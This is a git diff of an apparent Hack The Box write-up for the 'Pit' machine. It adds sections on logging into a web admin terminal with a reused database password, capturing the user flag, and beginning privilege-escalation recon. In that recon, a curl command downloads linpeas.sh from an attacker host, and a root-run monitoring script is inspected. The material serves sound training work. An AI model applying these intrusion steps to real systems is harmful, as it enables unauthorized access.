@@ -197,7 +197,7 @@ Next, I try to view the source code of the webpage and was able to find the full
     <smtp smtpServer="localhost" smtpPort="25" smtpSendFrom="seeddms@localhost" smtpUser="" smtpPassword=""/> 
 ```
 
-## obtaining user flag
+## Obtaining user flag
 Using the database password and the user ```michelle``` as the username, we are able to login to the web admin portal on ```pit.htb:9090```. This portal seems to be a monitoring platform to monitor the services/infrastructure of the web servers. Researching on the CentOS web admin portal, we are able to find a ```/system/terminal``` endpoints that contains a web terminal. \
 From the web terminal, we are then able to obtain the user flag.
 ```
@@ -205,5 +205,36 @@ From the web terminal, we are then able to obtain the user flag.
 user.txt
 [michelle@pit ~]$ cat user.txt
 9f5f5195c48e73b42768dbf22c2f7a80
+[michelle@pit ~]$ 
+```
+
+## Obtaining system flag
+First, let run the ```linpeas``` script to check the permissions on this terminal. However, the script was unable to provide any meaningful output about possible privilege escalations. 
+```
+[michelle@pit ~]$ curl -o linpeas.sh http://10.10.16.250:8000/linpeas.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  447k  100  447k    0     0   158k      0  0:00:02  0:00:02 --:--:--  158k
+```
+Next we double check the output from the ```snmpwalk``` earlier and we discover a suspicious string ```/usr/bin/monitor```
+```
+iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
+```
+
+Let's check the contents of ```/usr/bin/monitor```. We can see that ```/usr/bin/monitor``` executes a script in ```/usr/local/monitoring/check*sh```, but we do not have the permissions to view the directory and we are also unable to find the file. 
+```
+[michelle@pit ~]$ cat /usr/bin/monitor
+#!/bin/bash
+
+for script in /usr/local/monitoring/check*sh
+do
+    /bin/bash $script
+done
+[michelle@pit ~]$ echo $script
+
+[michelle@pit ~]$ ls /usr/local/monitoring
+ls: cannot open directory '/usr/local/monitoring': Permission denied
+[michelle@pit ~]$ cat /usr/local/monitoring/check.sh
+cat: /usr/local/monitoring/check.sh: No such file or directory
 [michelle@pit ~]$ 
 ```
